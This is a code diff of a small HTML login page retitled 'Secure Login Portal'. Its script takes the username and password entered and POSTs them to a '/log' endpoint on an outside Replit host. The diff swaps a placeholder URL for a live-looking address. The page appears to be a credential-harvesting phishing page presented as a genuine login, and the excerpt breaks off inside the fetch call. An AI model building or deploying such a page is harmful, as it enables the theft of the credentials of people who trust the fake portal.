@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Secure Login Portal</title>
   <style>
     body {
       background: #0e0e0e;
@@ -15,13 +15,11 @@
       justify-content: center;
       height: 100vh;
     }
-
     form {
       display: flex;
       flex-direction: column;
       width: 300px;
     }
-
     input, button {
       margin: 10px 0;
       padding: 10px;
@@ -29,12 +27,10 @@
       border-radius: 4px;
       font-family: monospace;
     }
-
     input {
       background: #222;
       color: #00ffcc;
     }
-
     button {
       background: #00ffcc;
       color: #000;
@@ -51,14 +47,14 @@
   </form>
 
   <script>
-    document.getElementById("login-form").addEventListener("submit", async function (e) {
+    document.getElementById("login-form").addEventListener("submit", async (e) => {
       e.preventDefault();
 
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
       try {
-        const response = await fetch("https://YOUR-REPLIT-URL.repl.co/log", {
+        const response = await fetch("https://a5a10927-cfe5-47a9-be9b-72a073c3766a-00-2bp4xmv4d44nm.pike.replit.dev/log", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
